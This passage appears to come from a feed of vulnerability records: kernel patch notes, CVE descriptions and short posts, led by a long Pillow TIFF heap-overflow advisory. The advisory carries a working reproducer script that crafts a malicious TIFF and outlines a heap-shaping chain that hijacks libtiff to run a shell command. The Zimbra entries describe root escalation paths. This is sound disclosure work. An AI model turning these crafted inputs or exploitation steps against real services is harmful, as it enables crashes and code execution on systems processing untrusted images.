  bnxt_en 0000:18:00.0 eno1np0: Abandoning msg {0xb4 0x41a} len: 0 due to firmware status: 0x2000001
  ...
  NETDEV WATCHDOG: eno1np0 (bnxt_en): transmit queue 0 timed out

The fault address (0xfc499000) is on an exact 4KB page boundary,
pointing to a DMA read buffer overrun.

In bnxt_start_xmit(), packets smaller than BNXT_MIN_PKT_SIZE (52 bytes),
such as 42-byte untagged ARP frames, are padded:

    if (length < BNXT_MIN_PKT_SIZE) {
        pad = BNXT_MIN_PKT_SIZE - length;
        if (skb_pad(skb, pad))
            goto tx_kick_pending;
        length = BNXT_MIN_PKT_SIZE;
    }

    mapping = dma_map_single(&pdev->dev, skb->data, len, DMA_TO_DEVICE);
    ...
    dma_unmap_len_set(tx_buf, len, len);

However, 'len' was initialized earlier to skb_headlen(skb) (e.g. 42 bytes)
and is left unadjusted after padding. Consequently, dma_map_single() and
dma_unmap_len_set() map and track only 42 bytes.

Later, the hardware TX buffer descriptor is programmed with the padded length:

    txbd->tx_bd_len_flags_type =
        cpu_to_le32(((len + pad) << TX_BD_LEN_SHIFT) | flags |
                    TX_BD_FLAGS_PACKET_END);

The NIC DMA engine is thus instructed to read 52 bytes from a region where
only 42 bytes were DMA-mapped. If skb->data ends near the boundary of a 4KB
page (within 'pad' bytes of the next page), the hardware DMA read overruns
into the unmapped adjacent page, triggering an IOMMU fault.

This issue was exposed after commit 447cbe95ebb9 ("vlan: fix skb_under_panic
and races when toggling HW VLAN offload") because reserving extra VLAN
headroom rounded LL_RESERVED_SPACE from 48 up to 64 bytes, shifting skb->data
offsets and potentially causing small frames to land right against page
boundaries.

Fix this by using skb_put_padto(skb, BNXT_MIN_PKT_SIZE) in
bnxt_start_xmit(), before skb_shinfo(skb)->nr_frags is sampled,
because padding might linearize the skb.
This ensures skb->len and skb_headlen(skb) reflect the padded size so
that dma_map_single() maps the full buffer and the descriptor length is
consistent. This also removes the temporary 'pad' variable and masking logic.

The padding is done after the SW USO branch, otherwise
bnxt_sw_udp_gso_xmit() would account the padding as UDP payload
and send it in extra segments.

Note that SW USO segments are still not padded: with IPv4, a segment
carrying less than 10 bytes of UDP payload (small gso_size, or a short
last segment) is sent as a frame shorter than BNXT_MIN_PKT_SIZE.
This is a separate issue, left for a followup patch.

🔴 CVE-2026-99079 - Critical (9.8)

In the Linux kernel, the following vulnerability has been resolved:

When an XDP redirect to an AF_XDP socket fails because its RX ring is
full, the XSK core frees the buffer. During the...

CVE-2026-99079.description:
In the Linux kernel, the following vulnerability has been resolved:

net/mlx5e: Prevent stale XSK buffer release on refill retry

When an XDP redirect to an AF_XDP socket fails because its RX ring is
full, the XSK core frees the buffer. During the subsequent batched refill
of a legacy cyclic RQ, mlx5e also releases the WQE's XSK buffer before
allocating a replacement. If that refill succeeds only partially, a WQE
left without a replacement retains its old buffer pointer.

The buffer can meanwhile be allocated to another WQE. A later refill
retry can then free the live buffer through the stale pointer and publish
the same UMEM frame twice.

Mark the WQE as released immediately after the driver-side free. The flag
is already cleared when a replacement buffer is assigned, so refill
retries no longer release stale pointers.

The failure is silent and produces no kernel warning or splat. A
standalone legacy cyclic-RQ zero-copy libxsk reproducer, using 64-byte UDP
traffic offered at 12 Mpps, detected it: stock stopped after 2,854,914
packets in 4.094 seconds, with 4,542 xdp_rx_ring_full events and 64
ownership/double-publication errors. With this change it processed
356,904,225 packets in 30 seconds despite 571,405 xdp_rx_ring_full events,
with no ownership or data errors.

CVE-2026-53921.description: odhcpd is the DHCPv6, DHCPv4, and router-advertisement server used by OpenWrt. Prior to version 25.12, odhcpd's DHCPv6 IA response handler writes past the end of a fixed 512-byte stack buffer (pdbuf) when a single DHCPv6 REQUEST carries enough IA options to nearly exhaust the reply space. Two independent overflow sites exist in the same call chain, both reachable from the network via a single unauthenticated UDP packet. odhcpd runs as root on OpenWrt; embedded targets often lack stack canaries and ASLR, making code execution realistic. This issue has been patched in version 25.12.

posts.content: CVE-2026-65651 temporalio/sqlparser: deeply nested unary expressions cause a runtime-fatal Go stack overflow that crashes the process, recover cannot catch it. CVSS 6.5. Patch still under review, so restrict parsing of untrusted SQL now. https://www.valtersit.com/cve/CVE-2026-65651/

CVE-2026-65651.description: temporalio/sqlparser accepts SQL containing deeply nested unary expressions and can return a correspondingly deep abstract syntax tree without enforcing an applicable nesting limit. The library's String and Walk operations recursively traverse that tree. An application that parses attacker-controlled SQL and later formats or walks the returned tree can encounter a runtime-fatal Go stack overflow that terminates the process; Go panic recovery cannot contain this condition. Temporal Server passes caller-controlled query input through the affected parser in archival, visibility, and worker-query paths. In affected validation paths, the Server recursively formats an invalid expression while constructing an error. In a supported authenticated deployment, a caller with namespace read permission can terminate the receiving Frontend or Matching process. The dynamically confirmed ListWorkers route additionally requires at least one retained worker heartbeat. Repeated requests can sustain a denial of service. The issue affects availability only; no confidentiality or integrity impact was identified.

CVE-2026-50057.description: A local privilege escalation vulnerability in the Zimbra Collaboration Suite (ZCS) MTA package allows the Unix zimbra account to execute arbitrary commands as root. The installed sudo policy permits passwordless root execution of Postfix administration commands without restricting their arguments. An attacker can select a zimbra-controlled daemon_directory in the Postfix configuration and invoke postfix set-permissions, causing Postfix to execute the attacker's post-install program as root. The Postfix configuration directory is also writable by zimbra, so restricting postconf alone does not remove the execution path. Exploitation requires local command execution as zimbra on an MTA node. ZCS 10.1.16 and 10.1.21 are affected.

CVE-2026-50056.description: A local privilege escalation vulnerability in the zmmailboxdmgr launcher of Zimbra Collaboration Suite (ZCS) allows the Unix zimbra account to execute arbitrary commands as root. The passwordless sudo interface accepts JVM arguments that are not adequately restricted. An attacker can postpone Jetty's privilege drop, register an OnOutOfMemoryError command and force heap exhaustion during startup, causing the command to execute while the JVM still runs as root. Exploitation requires local command execution as zimbra on a mailbox server and interrupts mailboxd during the malicious restart. ZCS 10.1.16 and 10.1.21 are affected.

The flaw affects FortiSIEM's gRPC QueryResultReq handler. Improper validation of attacker-controlled metadata allows path traversal and arbitrary file writes, which can be chained into remote code execution by overwriting files that are later executed by the system.

CVSS: 9.4 Critical
Affected: FortiSIEM 7.0.0 through 7.5.0 across multiple release branches
Fixed: FortiSIEM 7.5.1 or 7.6.0 and later

The PoC targets the exposed gRPC service on TCP/27918 and demonstrates blind command execution through the arbitrary file-write chain.

CVE-2026-115778.description: Twisted is an event-based framework for internet applications, supporting Python 3.6+. Prior to 26.10.0rc1, twisted.conch.telnet.Telnet.dataReceived appends every byte received after IAC SB to a persistent subnegotiation buffer until IAC SE is received, without applying a maximum length. Telnet option negotiation occurs before authentication, so an unauthenticated peer can omit the terminator and continuously grow the buffer. The resulting memory exhaustion can terminate the process and every service it hosts. This issue is fixed in version 26.10.0rc1.

posts.content: CVE-2026-115932 (CRITICAL, CVSS 9.6) in GitroomHQ postiz-app (2.23.0 – 2.25.2): Directory traversal lets registered users read server files & send them to Discord. Disable self-registration & monitor input. https://radar.offseq.com/threat/cve-2026-115932-cwe-22-in-gitroomhq-postiz-app-59156eb748f8fa71 #OffSeq #CVE #Security #AppSec

CVE-2026-115932.description:
When a post is published, Postiz treats a media path that is not a web address as a file on the server's disk, but it does not check that the file lies inside the upload directory. A registered user can store a crafted media path with a post, get it past the checks that normally restrict it, and have the publishing worker read an arbitrary file and send it as an attachment to a Discord server the user controls.

The same unconfined reads can be reached through two further routes. One tells the caller whether a file exists and can exhaust the backend's memory, the other delivers the file the same way as the main route. Self-registration is open by default, so the attacker needs no existing account.

CVE-2026-115776.description:
## Summary

An unbounded-buffer vulnerability (CWE-770) in the Twisted words IRC server lets any unauthenticated remote client exhaust server memory. `twisted.words.protocols.irc.IRC.dataReceived` appends every received byte to a per-connection buffer and only removes data at a line feed, with no maximum length. Because `IRC` is a plain `Protocol` and not a `LineReceiver`, one connection that streams bytes without a line feed grows the buffer without bound and drives the whole single-threaded process to out-of-memory, dropping every user at once. The `twistd words` server inherits the method unchanged through `IRCUser`, and the data is buffered before any authentication.

## Details

`IRC.dataReceived` keeps everything up to the last line feed in `self.buffer`:

```python
# twisted/words/protocols/irc.py
class IRC(protocol.Protocol):        # not a LineReceiver, so no MAX_LENGTH
    buffer = ""
    def dataReceived(self, data):
        if isinstance(data, bytes):
            data = data.decode("utf-8")
        lines = (self.buffer + data).split(LF)
        self.buffer = lines.pop()    # no 3line feed -> whole input stays buffered
        ...
```

With no line feed in the data, `lines.pop()` returns the entire accumulated content to `self.buffer`, so it grows by every chunk and is never bounded; `IRC` defines no `MAX_LENGTH`, no `lineLengthExceeded`, and no timeout, so the connection is never closed. The `twistd words` server protocol `IRCUser` subclasses `IRC` without overriding `dataReceived`, and the buffer is filled before any `PASS`, `NICK`, or `USER`, so no credentials are required.

Affected product: Twisted (`twisted.words`), `twisted.words.protocols.irc.IRC` and its subclass `twisted.words.service.IRCUser`
Affected versions: 26.4.0 and earlier

## PoC

On a standard Twisted words IRC server (the server `twistd words` runs, using `IRCUser`), an unauthenticated client opens a single TCP connection and continuously sends data that contains no line feed, never completing a line. Every chunk is appended to the connection's line buffer, and because no complete line is ever formed none of it is consumed, so the buffer grows by the full volume sent.

In a measured run against a real `IRCFactory` server, one unauthenticated connection sending 60 MB of line-feed-free data raised the server process resident memory from about 47 MB to 2966 MB (roughly 49 MB per MB sent) with the connection still open and no limit triggered. Sending the same volume as normal line-feed-terminated commands leaves memory flat, which isolates the cause to the missing line-length bound.

## Impact

An unauthenticated remote denial of service from allocation without limits (CWE-770) leading to uncontrolled resource consumption (CWE-400). A single credential-free connection exhausts the memory of the whole `twistd words` process, and because one process serves every user, the crash drops all connections at once and the service stays down until it is restarted. The quadratic buffer copy reaches the same effect faster. There is no confidentiality or integrity impact and no code execution.

posts.content:
Three critical flaws (CVE-2026-112900, CVE-2026-112393, CVE-2026-112403, CVSS 9.2 each) let a crafted EPS, TIFF, or JPEG file trigger remote code execution or heap corruption. The EPS one shells out to Ghostscript with your filename completely unguarded. That is not a bug in this tutorial. That is the mechanic.

To remove the debuff, upgrade Pillow to 13.0.0 immediately. (2/3)

CVE-2026-112393.description:
```
============================================================================
Heap buffer overflow in _tiffWriteProc when saving TIFF to BytesIO
Location: src/libImaging/TiffDecode.c:94  in _tiffWriteProc()
Commit:   a707c6b21c313880d0771e54965d142dd42358b6
============================================================================
```

Pillow can write attacker-chosen data past the end of a heap buffer when it saves a TIFF image to an in-memory destination such as `io.BytesIO` rather than to a file. The same code also copies leftover heap memory from the process into the saved file. Anyone who can supply an image to a service that opens it and re-saves it as TIFF this way can trigger this with default settings. The attached reproducer crashes the process, and the overflow could potentially be developed further, but code execution is not demonstrated here.

The bug is in `_tiffWriteProc` in `src/libImaging/TiffDecode.c`. This is the write callback for the in-memory sink that Pillow gives libtiff whenever the save target has no `fileno()`. While writing the directory, libtiff seeks past the current end of data and writes tag values there. `_tiffWriteProc` sizes its `realloc()` from `state->size + size` instead of from the write position `state->loc`. As a result, the first out-of-line tag value written after that seek can run past the allocation by up to the size of the directory: 12 bytes per entry, 126 bytes in the minimal case, and 2384 bytes observed with a 331-entry directory. The overflowing bytes are the tail of a tag value taken from the uploaded file.

No save options are needed, because compression and tags are inherited from the source image. The overflow does require an attacker-sized out-of-line tag to reach libtiff. That happens when the opened TIFF is saved directly (ImageDescription, DocumentName or XMP), or through an embedded ICC profile, which survives `copy()` in `im.info`. The bytes libtiff skips for alignment are never initialised, so any compressed TIFF over 64 KiB written this way also leaks one stale heap byte per padding hole. That leak needs no crafted tag.

The attached reproducer builds a 131 KB PackBits TIFF and runs `Image.open(...).save(io.BytesIO(), "TIFF")`. Saving the same image to a file path succeeds, but the `BytesIO` save aborts with glibc's `malloc(): corrupted top size`. A second part of the script shows uninitialised heap bytes at the padding offsets of a `BytesIO` save that are zero in the file save. Saves to real files are unaffected. The defect dates to e782fe721e01 (2013) and has been present since Pillow 2.0.0.

## Details

When `im.save()` writes a TIFF through libtiff to a target that has no usable `fileno()` (`io.BytesIO`, an HTTP response object, a storage backend stream), libtiff is opened with `TIFFClientOpen()` on Pillow's own in-memory sink, `_tiffWriteProc` / `_tiffSeekProc` in `src/libImaging/TiffDecode.c`. libtiff treats that sink like a file: when it writes the directory it seeks *beyond* the current end of data (to `eof + IFD size`, where the out-of-line tag values go, and one byte further after every odd-length tag value to keep offsets even) and writes there. On a real file the kernel grows the file and zero-fills the gap. The memory sink does neither correctly:

1. `_tiffWriteProc` sizes its `realloc()` from `state->size + size` instead of `state->loc + size`, so the first write after such a seek can land past the end of the new allocation — a heap buffer overflow whose content is tag data taken from the image being saved.
2. The bytes that libtiff skips are never written, and the grown region is a bare `realloc()`, so they reach the output TIFF with whatever the heap held before.

Both are reachable with default settings by the ordinary "re-encode the upload" sequence `Image.open(upload); im.save(io.BytesIO(), "TIFF")` with no save options: `compression` defaults to the source file's (`src/PIL/TiffImagePlugin.py:1734`), any compression other than raw selects the libtiff writer (`:1746`), the source's `tag_v2` entries are passed through to libtiff (`:1959`), and a target without `fileno()` leaves `_fp = 0` (`:1928-1935`), i.e. the memory sink. The overflow half additionally needs an attacker-controlled out-of-line tag value of the right length to reach libtiff. With the opened `TiffImageFile` saved directly (`tag_v2` passthrough) that can be a ~64 KiB ASCII tag (269/270/271/272) or the XMP packet (tag 700, type BYTE — arbitrary bytes), and the number of tags the upload carries sets the IFD size, i.e. the overrun length (12 bytes per entry; 2384 bytes with a 331-entry IFD observed). After `convert()`/`resize()`/`thumbnail()`/`copy()` the `tag_v2` entries are gone, but `im.info["compression"]` (still selecting libtiff) and `im.info["icc_profile"]` survive and the ICC profile is written as tag 34675 (`:1822-1824`), an equally attacker-controlled out-of-line value: `Image.open(x).copy().save(BytesIO(), "TIFF")` with the payload in the ICC profile produces the identical ASan report. The stale-byte half needs no attacker tag at all.

**Proof (overflow).** A 131 198-byte hand-built TIFF — mode L, 7×8191, `Compression=32773` (PackBits), an `ImageDescription` of 65 535 characters — opened with `Image.open()` and saved with `im.save(io.BytesIO(), "TIFF")` aborts a stock build with glibc's `malloc(): corrupted top size`. The same call against an AddressSanitizer build of the C extensions reports

```
AddressSanitizer: heap-buffer-overflow ... WRITE of size 65536
 #1 _tiffWriteProc src/libImaging/TiffDecode.c:115
 #4 TIFFFlush
 #5 ImagingLibTiffEncode src/libImaging/TiffDecode.c:1056
0 bytes to the right of 131072-byte region, allocated by realloc in _tiffWriteProc src/libImaging/TiffDecode.c:103
```

**Proof (uninitialised bytes).** Saving one 300×300 RGB image as `compression="tiff_lzw"` with four odd-length ASCII tags to a `BytesIO`, once with `MALLOC_PERTURB_=1` (glibc fills fresh allocations with 0xfe) and once with `MALLOC_PERTURB_=170` (0x55), gives two 369 463-byte TIFFs that differ in exactly 4 bytes, 0xfe vs 0x55, at offsets 369177, 369417, 369423, 369451 — the pad byte between the odd-length last strip and the IFD, and the pad byte after each odd-length tag value except the last. The same save to a filename gives byte-identical files with 0x00 there. Without any allocator tweaks, after a few 64 KB–400 KB Python `bytes` objects filled with 0xa7 are created and freed, re-saving an uploaded LZW TIFF carrying ten odd-length ASCII tags yields 0xa7 at all nine pad offsets.

### Code walk-through

The sink's state is `{data, size (allocated), loc (position), eof (high-water mark)}`; the encoder path starts it as a zeroed 64 KiB block (`TiffDecode.c:863`, `calloc(bufsize, 1)` with `bufsize = 64*1024`, `flrealloc = 1`). Seeking is unconstrained:

```c
/* src/libImaging/TiffDecode.c:124-141  _tiffSeekProc */
    case 0: state->loc = off;            break;   /* may exceed eof and size */
    case 1: state->loc += off;           break;
    case 2: state->loc = state->eof + off; break;
```

and writing assumes `loc <= size`:

```c
/* src/libImaging/TiffDecode.c:90-117  _tiffWriteProc */
    to_write = MIN(size, state->size - (tsize_t)state->loc);   /* negative if loc > size */
    if (state->flrealloc && size > to_write) {
        tsize_t newsize = state->size;
        while (newsize < (size + state->size)) {               /* capacity target ignores loc */
            …
            newsize += 64 * 1024;
        }
        new_data = realloc(state->data, newsize);              /* tail left uninitialised */
        …
        state->size = newsize;
        to_write = size;
    }
    _TIFFmemcpy((UINT8 *)state->data + state->loc, buf, to_write);   /* :115 */
    state->loc += (toff_t)to_write;
    state->eof = MAX(state->loc, state->eof);
```

A gdb trace of the sink calls during the overflowing save (stock build, breakpoints on the two procs) shows how libtiff drives it:

```
write size=63064 at loc=8      (eof=8     size=65536)     strip data (PackBits re-encode:
write size=2464  at loc=63072  (eof=63072 size=65536)      8 bytes/row × 8191 rows)
seek  off=0     whence=2       -> loc=65536 = eof = size   TIFFWriteDirectory: end of data, already even
seek  off=4;  write size=4 at loc=4                        link IFD offset into header
seek  off=65662 whence=0       (eof=65536 size=65536)      65536 + 126-byte IFD (10 entries) = tag data area
write size=65536 at loc=65662  (eof=65536 size=65536)      ImageDescription, first out-of-line value
```

For that last call `to_write = 65536 − 65662 = −126`, the loop grows `newsize` until it is ≥ `65536 + 65536`, i.e. to 131072, and the `memcpy` writes `[65662, 131198)` into a 131072-byte block: 126 bytes past the end, containing the last 126 bytes of the description string. `loc`/`eof` become 131198 > `size`; `ImagingLibTiffEncode` later sets `size = eof` (`:1067`) and copies `[0, eof)` out of the same block (`:1073`), reading past it as well.

The general condition is: at directory-write time the strip data ends within *IFD-size* bytes of the current allocation boundary, and the first out-of-line tag value has a length just below a multiple of 64 KiB. The overrun length is `IFD size + pad − slack`, so it grows by 12 bytes per additional tag. For single-band images (L, P, 1, I;16, F…) `BitsPerSample` is stored inline and the first out-of-line value in tag order is `DocumentName` (269) or `ImageDescription` (270) — both free-length ASCII strings taken from the source file. Pillow re-encodes the pixels itself, but with PackBits the compressed size is a deterministic function of attacker-chosen pixel rows (the reproducer uses rows of 7 distinct bytes → 8 bytes per row → exactly 65536 bytes including the 8-byte header), so the attacker controls both quantities. For multi-band images the 6-byte `BitsPerSample` array is written first and absorbs the growth, which is why RGB sources do not hit the overflow.

The disclosure half is the benign version of the same sequence. In the LZW/RGB trace the strip data ends at the odd offset 369177; libtiff places the IFD at 369178 and the tag values from 369364 on, and after each odd-length value seeks one byte forward before the next write (`seek off=369418 (loc=369417)`, `write size=5 at loc=369418`, …). Offsets 369177, 369417, 369423 and 369451 are therefore never written. They lie in the part of the buffer obtained by the `realloc()` calls at `:103` (the block grew 65536 → 196608 → 327680 → 458752 during the strip writes), which is not cleared, so the emitted file carries the previous heap contents at those positions. Holes that fall inside the initial 64 KiB are zero only because that block is `calloc`'d.

The defect was introduced in e782fe721e01 ("initial merge of wiredfool/Python-Imaging-Library-G4-Tiff-Support", 2013-03-08), first released in Pillow 2.0.0.

## Impact

Any service that accepts an image and produces a TIFF rendition into a non-file object — the usual pattern for returning or uploading the result without touching disk — is exposed to whoever supplies the image, with no non-default Pillow setting involved. The overflow additionally requires that an attacker-controlled out-of-line tag value reaches libtiff: the uploaded ImageDescription/DocumentName/XMP when the application saves the opened TIFF itself (or copies its tags into the save), or the embedded ICC profile, which survives `convert()`/`resize()`/`thumbnail()`/`copy()` in `im.info` together with the compression. Under those conditions, with a crafted single-band TIFF the uploader gets a heap out-of-bounds write in the worker process of IFD-size bytes (12 bytes per directory entry the upload carries — 126 bytes with the minimal reproducer, 2384 bytes with a 331-entry IFD) immediately past a 128 KiB-class `realloc` block, with the overwritten bytes being the tail of a tag value they chose; on the stock build the minimal reproducer is detected by glibc and kills the process (`SIGABRT`).

Given two addresses leaked by a separate bug, this write has been turned into code execution against a stock build of this commit with ASLR/PIE/NX enabled and default settings (that proof-of-concept is not included with this report): a single-process stdlib `http.server` worker doing nothing but `Image.open(BytesIO(body)).save(BytesIO(), "TIFF")` per upload executed an attacker-chosen shell command (`id>/tmp/r.XXXXXX`), answered `200` and kept serving (12/12 against a freshly started worker, 2/6 after twenty unrelated uploads; a miss normally leaves the worker running and is retryable). The two addresses (`&system`, `&PyBytes_Type`) were taken from an unrelated information disclosure in the same process; everything else is this bug plus properties of Pillow's TIFF reader used as a heap-shaping script. The 4.7 MB attack TIFF is a 397×165 8-bit PackBits image whose rows re-encode to exactly 65 528 bytes (strip ends at sink offset 65 536), a 63 942-byte XMP packet (tag 700) as the first out-of-line value, and ~500 private IFD entries. Because `TiffImagePlugin` turns every IFD entry into one `bytes` object in IFD order, frees an earlier entry when a later one repeats its tag number, and parses the IFD three times per request (`TiffImagePlugin.py:1258`, `:1271`, and `getexif()` from `load_end()` at `:1331`), those entries drain glibc's free lists, punch exact-size holes for every large allocation the save makes, and arrange that the 128 KiB `realloc` of the sink lands directly below a live 0x540 chunk followed by libtiff's own `TIFF` handle (`malloc(1313)` from `TIFFClientOpen`). The 2384 overflowing bytes rewrite the start of the `TIFF` struct with the command string, a zeroed `tif_dir`, `tif_diroff = 65536`, and `tif_cleanup = system` at +0x3f8; libtiff resumes `TIFFWriteDirectorySec` on the modified handle and calls `(*tif->tif_cleanup)(tif)`. With gdb on `__libc_system` the call arrives as `__libc_system("id>/tmp/r.…") ← libtiff.so.6 ← TIFFFlush ← ImagingLibTiffEncode (src/libImaging/TiffDecode.c:1056) ← _encode (src/encode.c:139)`. Offsets are per-binary constants (glibc 2.36, CPython 3.12.14, libtiff 4.5.0, this `_imaging.so`), all obtainable from public distribution files.

Independently, every compressed TIFF written to such a target that exceeds 64 KiB discloses one byte of stale heap per alignment hole (one per odd-length tag value plus possibly one before the IFD; the count is set by the tags in the uploaded file) at predictable offsets in the returned file — low bandwidth, but it is other requests' freed data. File-path and real-fd targets (`TIFFFdOpen`) are unaffected by either issue. The primitive is the same class and attacker position as the `TiffDecode.c` decode-side heap overflows CVE-2020-35654, CVE-2021-25289 and CVE-2020-10379, but on the encode path and behind the output-to-a-non-file and tag-passthrough preconditions above, with code execution additionally depending on an address leak from another bug.

## Reproducing

`repro` is a single Python script that uses the installed Pillow, writes its inputs into a temporary directory. It has two parts. Each part compares saving to a file path, which goes through `TIFFFdOpen` and is correct, with the same save into an `io.BytesIO`, which goes through the `_tiffWriteProc` memory sink.

**Part 1: heap overflow.** `setup_env()` builds `upload.tif` (131 198 bytes) byte by byte: a mode L, 7×8191 image with `Compression=32773` (PackBits) and a 65 535-character `ImageDescription`. The sizes are picked so that when Pillow re-encodes the pixels, the strip comes to 8 + 8191 × 8 = 65 536 bytes and ends exactly at the sink's initial 64 KiB buffer. libtiff then seeks past the 126-byte IFD and writes the 65 536-byte description at offset 65 662. The sink grows only to 131 072 bytes, so the last 126 bytes of the description are written past the end of the heap block. In a fresh child process, the script runs `Image.open("upload.tif").save(<target>, "TIFF")` with no options, once with `"out.tif"` as the target and once with `io.BytesIO()`. The file save exits with 0. The BytesIO save is killed by SIGABRT, with glibc reporting `malloc(): corrupted top size`.

**Part 2: stale heap bytes in the output.** A child started with `MALLOC_PERTURB_=170` (glibc fills fresh allocations with 0x55) saves a seeded-noise 300×300 RGB image with `compression="tiff_lzw"` and four odd-length ASCII tags. It saves once to a file and once to a BytesIO, then prints every offset where the two outputs differ. libtiff skips one pad byte before the IFD and one after each odd-length tag value. The file has 0x00 at those offsets, but the BytesIO output still holds the 0x55 that was in uninitialised `realloc()` memory.

Expected output on this tree:

```
upload.tif: 131198 bytes
save to file path : exit code 0, out.tif = 131210 bytes
save to BytesIO   : exit code -6, stderr: 'malloc(): corrupted top size'
-> heap overflow crashed the process: True

same image, same options, saved to a file path vs. to a BytesIO:
  offset 369177: file 0x00   BytesIO 0x55
  offset 369417: file 0x00   BytesIO 0x55
  offset 369423: file 0x00   BytesIO 0x55
  offset 369451: file 0x00   BytesIO 0x55

-> BytesIO output contains never-written heap bytes: True

BUG
```

The last line is `BUG` if either part shows its defect, and `OK` otherwise. With the attached patch applied and rebuilt, the BytesIO save exits with 0, the two outputs are identical, and the script prints `OK`.

## Suggested fix

The attached patch makes `_tiffWriteProc` in `src/libImaging/TiffDecode.c` honour sparse-file semantics: it sizes the buffer from the write position, and zeroes what `realloc()` adds (the initial block is already `calloc`'d, so every byte libtiff skips then reads as 0, exactly as through `TIFFFdOpen`). For the non-reallocating case (`flrealloc == 0`), where `loc > size` would also make `to_write` negative, it rejects the write with a `TIFFError`, the same idiom `_tiffReadProc` uses:

```diff
-        while (newsize < (size + state->size)) {
+        while (newsize < (size + (tsize_t)state->loc)) {
 …
+        memset((UINT8 *)new_data + state->size, 0, newsize - state->size);
         state->data = new_data;
         state->size = newsize;
         to_write = size;
+    } else if (to_write < 0) {
+        TIFFError("_tiffWriteProc", "Invalid Write at loc %" PRIu64 ", size: %" PRIu64, …);
+        return 0;
     }
```

`_tiffSeekProc` is left unconstrained, since libtiff legitimately seeks past the end of data; with the write proc fixed, `eof` can no longer exceed `size`, so the read-out in `ImagingLibTiffEncode` (`:1067`, `:1073`) stays within the block. The patch also adds `test_save_bytesio_seek_past_end` to `Tests/test_file_libtiff.py`, which saves the PackBits 64 KiB-boundary case and an LZW case with odd-length tags to both a file and a `BytesIO` and asserts the outputs are identical. With the patch applied and rebuilt, the BytesIO output is byte-identical to the file output, no AddressSanitizer report is produced for tag lengths 65410/65535/131071/196607, the code-execution chain described under Impact no longer runs its command, and the existing TIFF tests pass.

## The patch

Size the libtiff in-memory write buffer from the write position, not its current size, and zero the space added by realloc in _tiffWriteProc

Applies to `src/libImaging/TiffDecode.c` at the commit above.

## The reproducer

<details>
<summary>Reproducer — <code>repro</code>, 5,434 bytes (click to open)</summary>

Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.

```python
#!/usr/bin/env python3
"""
Pillow: heap overflow + stale heap bytes in the libtiff in-memory write sink
(_tiffWriteProc, src/libImaging/TiffDecode.c).

im.save(<BytesIO>, "TIFF") with any compression goes through libtiff writing
into Pillow's memory sink. When libtiff writes the directory it seeks *past*
the end of the data written so far and writes tag values there:

  1. _tiffWriteProc grows the buffer to `size + write_len` instead of
     `loc + write_len`, so that write can run off the end of the allocation.
  2. The bytes libtiff skipped over are never written, so whatever the heap
     held there ends up in the output file.

The same saves to a file path are fine (the kernel zero-fills skipped bytes),
which is the control for both parts.
"""
import os
import resource
import struct
import subprocess
import sys
import tempfile

resource.setrlimit(resource.RLIMIT_CORE, (0, 0))   # the overflow aborts; no core file
os.chdir(tempfile.mkdtemp())


def run(code, **env):
    """Run a Python snippet against the installed Pillow in a fresh process."""
    return subprocess.run([sys.executable, "-c", code], env={**os.environ, **env},
                          capture_output=True, text=True)


def setup_env():
    """Write upload.tif: an L-mode 7x8191 PackBits TIFF with a 65535-char ImageDescription.

    Sizes are chosen so that, when Pillow re-encodes it:
      - the PackBits strip is 8191 rows x 8 bytes + 8-byte header = 65536 bytes,
        i.e. the data ends exactly at the sink's initial 64 KiB buffer;
      - the first out-of-line tag value (ImageDescription + NUL) is 65536 bytes
        and goes at 65536 + 126 (the 10-entry IFD sits in between).
    The sink grows to 65536 + 65536 = 131072 bytes, then writes [65662, 131198):
    the last 126 bytes of the description land past the end of the heap block.
    """
    w, h = 7, 8191
    # 7 distinct bytes per row -> PackBits can only emit one literal run: 1 + 7 bytes
    strip = b"".join(b"\x06" + bytes((y * 7 + x) * 37 & 0xFF for x in range(w)) for y in range(h))
    desc = b"D" * 65535 + b"\x00"
    strip_off, desc_off = 8, 8 + len(strip)
    ifd_off = desc_off + len(desc)
    entries = [
        (256, 4, 1, w),                  # ImageWidth
        (257, 4, 1, h),                  # ImageLength
        (258, 3, 1, 8),                  # BitsPerSample
        (259, 3, 1, 32773),              # Compression = PackBits (inherited by save())
        (262, 3, 1, 1),                  # PhotometricInterpretation = BlackIsZero
        (270, 2, len(desc), desc_off),   # ImageDescription (carried into save() via tag_v2)
        (273, 4, 1, strip_off),          # StripOffsets
        (277, 3, 1, 1),                  # SamplesPerPixel
        (278, 4, 1, h),                  # RowsPerStrip
        (279, 4, 1, len(strip)),         # StripByteCounts
    ]
    ifd = struct.pack("<H", len(entries))
    ifd += b"".join(struct.pack("<HHII", *e) for e in entries)
    ifd += struct.pack("<I", 0)
    with open("upload.tif", "wb") as f:
        f.write(struct.pack("<2sHI", b"II", 42, ifd_off) + strip + desc + ifd)


# ---------------------------------------------------------------------------
# Part 1: heap buffer overflow. Re-save an uploaded TIFF with no options.
# ---------------------------------------------------------------------------
setup_env()
print(f"upload.tif: {os.path.getsize('upload.tif')} bytes")

RESAVE = 'from PIL import Image; import io; Image.open("upload.tif").save({target}, "TIFF")'

# Control: saving to a file path (real fd, no memory sink) works
control = run(RESAVE.format(target='"out.tif"'))
print(f"save to file path : exit code {control.returncode}, out.tif = {os.path.getsize('out.tif')} bytes")

# PoC: the identical save into a BytesIO
poc = run(RESAVE.format(target="io.BytesIO()"))
print(f"save to BytesIO   : exit code {poc.returncode}, stderr: {poc.stderr.strip()!r}")

# A process killed by a signal (SIGABRT from glibc's heap check) = heap corrupted
overflow = control.returncode == 0 and poc.returncode < 0
print(f"-> heap overflow crashed the process: {overflow}\n")


# ---------------------------------------------------------------------------
# Part 2: stale heap bytes in the output. MALLOC_PERTURB_=170 makes glibc fill
# fresh allocations with 0x55, so never-written bytes become visible.
# ---------------------------------------------------------------------------
STALE = r'''
import io, random
from PIL import Image
random.seed(1)
im = Image.new("RGB", (300, 300))      # noise -> ~360 KB LZW, so the sink must realloc()
im.putdata([tuple(random.randrange(256) for _ in "rgb") for _ in range(300 * 300)])
# odd-length ASCII tags: libtiff skips one pad byte after each
kw = dict(compression="tiff_lzw", description="abcdef", software="xyz0",
          tiffinfo={315: "artist", 33432: "copyright!", 306: "2024:01:01 00:00:00"})
im.save("ref.tif", "TIFF", **kw)
buf = io.BytesIO()
im.save(buf, "TIFF", **kw)
a, b = open("ref.tif", "rb").read(), buf.getvalue()
for i in (i for i in range(len(a)) if a[i] != b[i]):
    print(f"  offset {i}: file 0x{a[i]:02x}   BytesIO 0x{b[i]:02x}")
'''
stale = run(STALE, MALLOC_PERTURB_="170").stdout
print("same image, same options, saved to a file path vs. to a BytesIO:")
